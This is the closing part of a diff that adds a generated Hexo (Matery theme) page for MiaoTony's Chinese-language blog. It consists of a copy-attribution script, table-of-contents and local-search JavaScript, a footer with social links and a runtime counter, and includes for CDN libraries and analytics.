+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MiaoTony&#39;s小窝<br />'
+            + '文章作者: MiaoTony<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+        <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">MiaoTony</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">346.5k</span>&nbsp;字
+                                                                                    <span id="busuanzi_container_site_pv">
+			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+                                    <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+                        <br>
+                        <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+                        <br>
+                    </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
+        <i class="fab fa-telegram"></i>
+    </a>
+
+
+
+    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    var cnt = 1;
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var content_index = [];
+                        var data_title_origin = data.title.trim();
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
+                            cnt += 1;
+    
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 300 characters
+                                var start = first_occur - 30;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                var match_content = content.substr(start, 300);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+    
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>
+
+    
+
+    
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
